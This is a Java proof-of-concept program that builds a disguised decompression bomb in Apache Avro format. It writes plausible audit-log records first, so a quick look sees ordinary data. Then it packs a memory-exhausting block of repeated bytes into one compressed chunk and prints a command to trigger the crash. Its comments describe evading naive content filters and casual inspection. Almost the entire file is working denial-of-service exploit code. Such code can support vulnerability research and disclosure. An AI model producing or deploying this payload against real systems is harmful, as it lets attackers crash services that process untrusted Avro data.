package poc;

import org.apache.avro.Schema;
import org.apache.avro.file.CodecFactory;
import org.apache.avro.file.DataFileWriter;
import org.apache.avro.generic.GenericData;
import org.apache.avro.generic.GenericDatumWriter;
import org.apache.avro.generic.GenericRecord;

import java.io.File;
import java.nio.ByteBuffer;

/**
 * Generates a realistic-looking Avro file that doubles as a decompression bomb.
 *
 * Design goals:
 *   - Schema looks like a plausible application-event log (timestamp, user,
 *     event_type, message, attachment).
 *   - First N records contain small, legitimate-looking data so that any
 *     casual inspection ("avro-tools tojson --head 5 file.avro") sees
 *     ordinary records.
 *   - Subsequent "bomb" records each carry a 1 MB attachment filled with a
 *     repeating 4-byte pattern (0xDEADBEEF).  The sync interval is set to
 *     Integer.MAX_VALUE so ALL bomb records land in a single Avro block.
 *     When that block is compressed with deflate-9, the ~1000:1 ratio means
 *     the block shrinks dramatically.  On read, the codec must decompress the
 *     entire block at once into an unbounded ByteArrayOutputStream -> OOM.
 *   - The preamble is flushed into its own block first, so those records
 *     read successfully before the bomb block triggers the crash.
 *
 * Usage:
 *   java poc.CraftBomb [output-file] [decompressed-size-MB] [codec]
 *
 *   Defaults: crafted-bomb.avro, 50 MB, deflate
 *   Supported codecs: deflate, bzip2, zstandard, snappy, xz
 *
 *   For a 2 GB bomb:
 *     java -Xmx4g poc.CraftBomb crafted-bomb-2g.avro 2048
 *
 *   For a bzip2 bomb:
 *     java -Xmx256m poc.CraftBomb bomb-bzip2.avro 50 bzip2
 *
 * Result for 50 MB deflate:  ~50 KB on disk  (~1000:1)
 * Result for 2 GB deflate:   ~2 MB on disk   (~1000:1)
 */
public class CraftBomb {

    // ---- Schema -----------------------------------------------------------
    private static final String SCHEMA_JSON = "{\n"
        + "  \"type\": \"record\",\n"
        + "  \"name\": \"AuditEvent\",\n"
        + "  \"namespace\": \"com.example.events\",\n"
        + "  \"doc\": \"Application audit event with optional binary attachment.\",\n"
        + "  \"fields\": [\n"
        + "    {\"name\": \"timestamp\",   \"type\": \"long\",   \"doc\": \"Unix epoch millis\"},\n"
        + "    {\"name\": \"user_id\",     \"type\": \"string\", \"doc\": \"Authenticated principal\"},\n"
        + "    {\"name\": \"event_type\",  \"type\": {\"type\": \"enum\", \"name\": \"EventType\",\n"
        + "        \"symbols\": [\"LOGIN\",\"LOGOUT\",\"UPLOAD\",\"DOWNLOAD\",\"DELETE\",\"EXPORT\"]}},\n"
        + "    {\"name\": \"source_ip\",   \"type\": \"string\"},\n"
        + "    {\"name\": \"message\",     \"type\": \"string\"},\n"
        + "    {\"name\": \"attachment\",  \"type\": \"bytes\",  \"doc\": \"Optional binary payload\"}\n"
        + "  ]\n"
        + "}";

    // ---- Preamble records (innocent) --------------------------------------
    private static final String[][] PREAMBLE = {
        {"1736899200000", "alice@example.com",   "LOGIN",    "192.168.1.42",    "User authenticated via SSO"},
        {"1736899201500", "bob@corp.internal",   "UPLOAD",   "10.0.12.7",       "Uploaded quarterly-report-Q4.pdf (2.3 MB)"},
        {"1736899203000", "charlie@example.com", "DOWNLOAD", "172.16.0.99",     "Downloaded dataset export-2025-01-14.csv"},
        {"1736899210000", "diana@example.com",   "DELETE",   "192.168.1.55",    "Deleted stale cache objects (batch #4091)"},
        {"1736899215000", "eve@partner.co",      "EXPORT",   "203.0.113.12",    "Exported compliance report CR-2025-0114"},
        {"1736899220000", "frank@example.com",   "LOGIN",    "198.51.100.3",    "User authenticated via LDAP"},
        {"1736899225000", "grace@corp.internal",  "UPLOAD",   "10.0.12.22",     "Uploaded signed-contract-vendor-A.pdf (890 KB)"},
        {"1736899230000", "heidi@example.com",   "LOGOUT",   "192.168.1.42",    "Session expired after 30 min idle timeout"},
    };

    private static final byte[] TINY_PDF_STUB = {
        0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x34,  // %PDF-1.4
        0x0A, 0x25, (byte)0xE2, (byte)0xE3, (byte)0xCF, (byte)0xD3, 0x0A
    };

    // Repeating pattern for bomb payload -- not all-zeros to bypass naive
    // content filters, yet still compresses at ~1000:1 with deflate.
    private static final byte[] REPEAT_PATTERN = {
        (byte) 0xDE, (byte) 0xAD, (byte) 0xBE, (byte) 0xEF
    };

    // Size of each bomb record's attachment.  We use many 1 MB records
    // rather than one giant record so we stay below Java's ~2 GB array limit.
    private static final int CHUNK_SIZE = 1 * 1024 * 1024; // 1 MB per record

    public static void main(String[] args) throws Exception {
        String outputFile = args.length > 0 ? args[0] : "crafted-bomb.avro";
        int bombSizeMB    = args.length > 1 ? Integer.parseInt(args[1]) : 50;
        String codecName  = args.length > 2 ? args[2].toLowerCase() : "deflate";
        long bombSizeBytes = (long) bombSizeMB * 1024 * 1024;
        int numBombRecords = (int) ((bombSizeBytes + CHUNK_SIZE - 1) / CHUNK_SIZE);

        CodecFactory codecFactory = createCodec(codecName);

        System.out.println("=== Avro Decompression Bomb -- Crafted File Generator ===");
        System.out.println();
        System.out.println("Output:              " + outputFile);
        System.out.println("Schema:              com.example.events.AuditEvent");
        System.out.println("Codec:               " + codecName);
        System.out.println("Preamble records:    " + PREAMBLE.length);
        System.out.println("Bomb target size:    " + bombSizeMB + " MB"
                + " (" + numBombRecords + " x " + (CHUNK_SIZE / (1024*1024)) + " MB records)");
        System.out.println("Bomb payload:        repeating 0xDEADBEEF");
        System.out.println();

        // Pre-fill a reusable 1 MB chunk with the repeating pattern.
        byte[] chunk = new byte[CHUNK_SIZE];
        for (int offset = 0; offset < chunk.length; offset += REPEAT_PATTERN.length) {
            int len = Math.min(REPEAT_PATTERN.length, chunk.length - offset);
            System.arraycopy(REPEAT_PATTERN, 0, chunk, offset, len);
        }
        ByteBuffer chunkBuf = ByteBuffer.wrap(chunk);

        Schema schema = new Schema.Parser().parse(SCHEMA_JSON);
        Schema eventTypeSchema = schema.getField("event_type").schema();

        try (DataFileWriter<GenericRecord> writer =
                new DataFileWriter<>(new GenericDatumWriter<>(schema))) {

            writer.setCodec(codecFactory);

            // Avro caps sync interval at 1<<30 (1 GB) and pre-allocates an
            // internal buffer of syncInterval * 1.25.  We size the interval
            // to fit the entire bomb in one block when possible (up to 1 GB).
            // For bombs > 1 GB the writer auto-flushes, creating multiple
            // blocks -- the first ~1 GB block alone is enough to OOM any
            // JVM with < 1 GB free heap.
            int maxSync = 1 << 30; // Avro hard maximum
            int desiredSync = (int) Math.min(bombSizeBytes + (64 * 1024), maxSync);
            writer.setSyncInterval(Math.max(desiredSync, 64 * 1024));

            writer.create(schema, new File(outputFile));

            // ---- write innocent preamble records ----
            for (String[] r : PREAMBLE) {
                GenericRecord rec = new GenericData.Record(schema);
                rec.put("timestamp",  Long.parseLong(r[0]));
                rec.put("user_id",    r[1]);
                rec.put("event_type", new GenericData.EnumSymbol(eventTypeSchema, r[2]));
                rec.put("source_ip",  r[3]);
                rec.put("message",    r[4]);
                rec.put("attachment", ByteBuffer.wrap(
                        "UPLOAD".equals(r[2]) ? TINY_PDF_STUB : new byte[0]));
                writer.append(rec);
            }

            // Flush preamble into its own block.
            writer.sync();

            // ---- write bomb records (all in one block) ----
            long baseTimestamp = 1736899240000L;
            for (int i = 0; i < numBombRecords; i++) {
                GenericRecord rec = new GenericData.Record(schema);
                rec.put("timestamp",  baseTimestamp + (i * 1000L));
                rec.put("user_id",    "svc-data-export@internal");
                rec.put("event_type", new GenericData.EnumSymbol(eventTypeSchema, "EXPORT"));
                rec.put("source_ip",  "10.0.0.1");
                rec.put("message",    "DR replication chunk " + (i + 1) + "/" + numBombRecords);
                chunkBuf.rewind();
                rec.put("attachment", chunkBuf);
                writer.append(rec);

                if ((i + 1) % 256 == 0 || i == numBombRecords - 1) {
                    System.out.printf("  Writing bomb records: %d / %d  (%d MB)\r",
                            i + 1, numBombRecords, (long)(i + 1) * CHUNK_SIZE / (1024*1024));
                }
            }
            System.out.println();
            // writer.close() will flush the bomb block and compress it.
        }

        // ---- report ----
        File f = new File(outputFile);
        long fileSize = f.length();
        double ratio = (double) bombSizeBytes / fileSize;
        int totalRecords = PREAMBLE.length + numBombRecords;

        System.out.println();
        System.out.println("Result:");
        System.out.println("  Total records:     " + totalRecords
                + " (" + PREAMBLE.length + " preamble + " + numBombRecords + " bomb)");
        System.out.println("  File size on disk: " + fileSize + " bytes"
                + " (" + formatSize(fileSize) + ")");
        System.out.println("  Decompressed bomb: " + bombSizeMB + " MB"
                + " (" + String.format("%,d", bombSizeBytes) + " bytes)");
        System.out.println("  Compression ratio: " + String.format("%.0f", ratio) + ":1");
        System.out.println();
        System.out.println("Trigger with:");
        int suggestedHeap = Math.max(32, bombSizeMB / 4);
        System.out.println("  java -Xmx" + suggestedHeap + "m -cp <jar> poc.TriggerOOM " + outputFile);
    }

    /**
     * Create a CodecFactory for the given codec name.
     * Supported: deflate, bzip2, zstandard (zstd), snappy, xz, null.
     */
    private static CodecFactory createCodec(String name) {
        switch (name.toLowerCase()) {
            case "deflate":
                return CodecFactory.deflateCodec(9);
            case "bzip2":
                return CodecFactory.bzip2Codec();
            case "zstandard":
            case "zstd":
                return CodecFactory.zstandardCodec(3);
            case "snappy":
                return CodecFactory.snappyCodec();
            case "xz":
                return CodecFactory.xzCodec(6);
            case "null":
            case "none":
                return CodecFactory.nullCodec();
            default:
                System.err.println("Unknown codec: " + name);
                System.err.println("Supported: deflate, bzip2, zstandard, snappy, xz, null");
                System.exit(1);
                return null; // unreachable
        }
    }

    private static String formatSize(long bytes) {
        if (bytes >= 1024 * 1024) return String.format("%.1f MB", bytes / (1024.0 * 1024));
        if (bytes >= 1024)        return (bytes / 1024) + " KB";
        return bytes + " B";
    }
}
